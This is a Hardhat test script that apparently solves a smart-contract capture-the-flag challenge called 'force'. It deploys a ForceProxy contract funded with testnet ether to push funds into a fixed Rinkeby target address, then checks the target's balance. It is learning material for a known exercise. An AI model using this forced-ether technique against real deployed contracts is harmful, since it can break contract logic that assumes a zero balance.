import { ethers } from "hardhat";
import { expect } from "chai";

describe("force", function() {
    it("should solve force challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        const targetAddr = "0x1ECD653Fca622112616427cdB45Fe3B879019612";

        const proxyFactory = await ethers.getContractFactory("ForceProxy");
        const proxyCont = await proxyFactory.deploy(targetAddr, { value: ethers.utils.parseEther("0.0005") });
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash);
        
        balance = await ethers.getDefaultProvider("rinkeby").getBalance(targetAddr);
        
        console.log(balance);
        expect(balance).to.gt(0);
    });
});